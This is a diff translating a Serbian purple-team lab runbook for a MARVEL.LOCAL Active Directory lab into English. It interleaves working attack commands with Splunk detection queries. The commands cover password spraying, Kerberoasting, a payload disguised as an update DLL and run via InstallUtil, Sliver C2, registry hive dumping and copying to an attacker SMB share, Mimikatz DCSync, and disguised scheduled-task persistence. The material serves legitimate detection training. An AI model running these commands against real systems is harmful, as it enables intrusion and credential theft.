@@ -18,7 +18,7 @@
 4. SPIDERMAN
 5. Kali
 
-### Kali — priprema
+### Kali — preparation
 ```bash
 # Sliver server
 sudo sliver-server
@@ -32,7 +32,7 @@ chmod 777 /tmp/share
 sudo impacket-smbserver share /tmp/share -smb2support -username kali -password kali
 ```
 
-### Windows mašine — verifikacija
+### Windows machines — verification
 ```powershell
 Get-Service SplunkForwarder
 Get-Service Sysmon64
@@ -102,13 +102,13 @@ cd ~/kerbrute
 ./kerbrute passwordspray --dc 192.168.182.135 -d MARVEL.LOCAL users_clean.txt 'Password1' --delay 100
 ```
 
-### BloodHound (nakon dobijanja credentials)
+### BloodHound (after credentials are recovered in Segment 2)
 ```bash
 bloodhound-python -c All -u fcastle -p Password1 -d MARVEL.LOCAL -ns 192.168.182.135
 ls -la *.json
 ```
 
-### Splunk — Password Spray detekcija
+### Splunk — password spray detection
 ```spl
 index=main source="WinEventLog:Security" EventCode=4771
 | rex field=Message "Client Address:\s*::ffff:(?<src_ip>[^\r\n]+)"
@@ -117,7 +117,7 @@ index=main source="WinEventLog:Security" EventCode=4771
 | sort - _time
 ```
 
-### Splunk — Uspešna autentifikacija (spray hit)
+### Splunk — successful authentication (spray hit)
 ```spl
 index=main source="WinEventLog:Security" EventCode=4768
 | rex field=Message "Client Address:\s*::ffff:(?<src_ip>[^\r\n]+)"
@@ -126,7 +126,7 @@ index=main source="WinEventLog:Security" EventCode=4768
 | sort - _time
 ```
 
-### Splunk — Spray detection (više usera sa istog IP u kratkom periodu)
+### Splunk — spray detection (several users from one IP in a short window)
 ```spl
 index=main source="WinEventLog:Security" EventCode=4771
 | rex field=Message "Client Address:\s*::ffff:(?<src_ip>[^\r\n]+)"
@@ -165,14 +165,14 @@ EOF
 mcs -target:library -r:/usr/lib/mono/4.5/System.Configuration.Install.dll /tmp/Punisher.cs -out:/tmp/share/GlobalProtect_Update.dll
 ```
 
-### THEPUNISHER — Preuzmi i pokreni (CMD)
+### THEPUNISHER — download and run (CMD)
 ```cmd
 copy \\192.168.182.133\share\GlobalProtect_Update.dll C:\Temp\GlobalProtect_Update.dll
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Temp\GlobalProtect_Update.dll
 type C:\Temp\pwned.txt
 ```
 
-### Splunk — InstallUtil detekcija
+### Splunk — InstallUtil detection
 ```spl
 index=main source="WinEventLog:Security" EventCode=4688 host=THEPUNISHER
 | rex field=Message "New Process Name:\s*(?<process>[^\r\n]+)"
@@ -208,7 +208,7 @@ impacket-GetUserSPNs MARVEL.LOCAL/fcastle:Password1 -dc-ip 192.168.182.135 -requ
 hashcat -m 13100 /tmp/kerberoast.hashes /usr/share/wordlists/rockyou.txt --force
 ```
 
-### Splunk — Kerberoasting detekcija (RC4 enc type)
+### Splunk — Kerberoasting detection (RC4 enc type)
 ```spl
 index=main source="WinEventLog:Security" EventCode=4769
 | rex field=Message "Account Name:\s*(?<username>[^\r\n]+)"
@@ -225,7 +225,7 @@ index=main source="WinEventLog:Security" EventCode=4769
 
 ## SEGMENT 5 — LATERAL MOVEMENT (Sliver C2)
 
-### Kali — Sliver setup (ako nije već aktivan)
+### Kali — Sliver setup (if not already running)
 ```bash
 sudo sliver-server
 ```
@@ -249,7 +249,7 @@ whoami
 pwd
 ```
 
-### Sliver shell — test konekcije prema DC
+### Sliver shell — connectivity test to the DC
 ```
 shell
 ```
@@ -258,7 +258,7 @@ Test-NetConnection -ComputerName 192.168.182.135 -Port 445
 Test-NetConnection -ComputerName 192.168.182.135 -Port 135
 ```
 
-### Splunk — C2 beaconing detekcija
+### Splunk — C2 beaconing detection
 ```spl
 index=main source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3 host=THEPUNISHER
 | rex field=Message "Image:\s*(?<process>[^\r\n]+)"
@@ -273,38 +273,45 @@ index=main source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3
 
 ## SEGMENT 6 — CREDENTIAL DUMPING
 
-### Sliver shell — SMB auth prema DC
+### Sliver shell — SMB auth to the DC
 ```cmd
 net use \\192.168.182.135\IPC$ /user:MARVEL\fcastle Password1
 ```
 
 ### Sliver shell — Registry hive dump
 ```cmd
-reg save HKLM\SAM C:\Temp\sam.hive /y
-reg save HKLM\SYSTEM C:\Temp\system.hive /y
-reg save HKLM\SECURITY C:\Temp\security.hive /y
+reg save HKLM\SAM C:\Temp\sam.hive /y        # succeeded
+reg save HKLM\SYSTEM C:\Temp\system.hive /y  # ACCESS DENIED, see below
+reg save HKLM\SECURITY C:\Temp\security.hive /y  # succeeded
 ```
 
-### Sliver shell — Kopiraj na Kali
+The SYSTEM hive is denied: it needs `SeBackupPrivilege`, and the Sliver shell holds the
+standard half of a UAC split token. Without that hive there is no bootkey, so the SAM
+hashes cannot be decrypted. See Phase 6 in
+[`02_attack_playbook.md`](02_attack_playbook.md).
+
+### Sliver shell — copy to Kali
 ```cmd
 net use \\192.168.182.133\share /user:kali kali
 cmd /c copy C:\Temp\sam.hive \\192.168.182.133\share\sam.hive
-cmd /c copy C:\Temp\system.hive \\192.168.182.133\share\system.hive
 cmd /c copy C:\Temp\security.hive \\192.168.182.133\share\security.hive
+# no system.hive to copy
 ```
 
 ### Kali — Secretsdump
 ```bash
-sudo impacket-secretsdump -sam /tmp/share/sam.hive -system /tmp/share/system.hive -security /tmp/share/security.hive LOCAL
+sudo impacket-secretsdump -sam /tmp/share/sam.hive -security /tmp/share/security.hive LOCAL
+# Result: "Either the SYSTEM hive or bootkey is required for local parsing, check help"
+# No hashes recovered.
 ```
 
-### DCSync — pokušaj (biće blokiran)
+### DCSync — attempt (blocked)
 ```cmd
-# Mimikatz — Defender blokira
+# Mimikatz, blocked by AMSI before execution
 C:\Temp\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:krbtgt /domain:MARVEL.LOCAL" "exit"
 ```
 
-### Splunk — Registry hive dump detekcija
+### Splunk — registry hive dump detection
 ```spl
 index=main source="WinEventLog:Security" EventCode=4688 host=THEPUNISHER
 | rex field=Message "Process Command Line:\s*(?<cmdline>[^\r\n]+)"
@@ -332,7 +339,7 @@ schtasks /create /tn "WindowsUpdateService" /tr "C:\Temp\GlobalProtect_Update.ex
 schtasks /query /tn "WindowsUpdateService"
 ```
 
-### Splunk — Scheduled task detekcija
+### Splunk — scheduled task detection
 ```spl
 index=main source="WinEventLog:Security" EventCode=4698 host=THEPUNISHER
 | rex field=Message "Task Name:\s*(?<taskname>[^\r\n]+)"
@@ -422,7 +429,7 @@ index=main source="WinEventLog:Security" EventCode=4625
 | sort - count
 ```
 
-### LOLBins detekcija
+### LOLBins detection
 ```spl
 index=main source="WinEventLog:Security" EventCode=4688
 | rex field=Message "Process Command Line:\s*(?<cmdline>[^\r\n]+)"
@@ -459,7 +466,7 @@ index=main source="WinEventLog:PowerShell" EventCode=4104
 | table _time, host, script
 ```
 
-### DCSync detekcija
+### DCSync detection
 ```spl
 index=main source="WinEventLog:Security" EventCode=4662
 | rex field=Message "Account Name:\s*(?<username>[^\r\n]+)"
@@ -506,7 +513,7 @@ chmod 777 /tmp/share
 sudo impacket-smbserver share /tmp/share -smb2support -username kali -password kali
 ```
 
-### Splunk forwarder ne šalje Sysmon
+### Splunk forwarder not sending Sysmon
 ```powershell
 # Dodaj u inputs.conf Sysmon stanza
 start_from = oldest
@@ -547,7 +554,7 @@ gpupdate /force
 ```bash
 # Dodaj -O flag
 hashcat -m 13100 /tmp/kerberoast.hashes /usr/share/wordlists/rockyou.txt --force -O
-# Ili koristi john
+# Or use john
 john /tmp/kerberoast.hashes --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
@@ -555,7 +562,7 @@ john /tmp/kerberoast.hashes --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 # UAC mora biti isključen na THEPUNISHER
 # HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System → EnableLUA = 0
-# Reboot pa pokreni implant ponovo
+# Reboot, then run the implant again
 ```
 
 ---
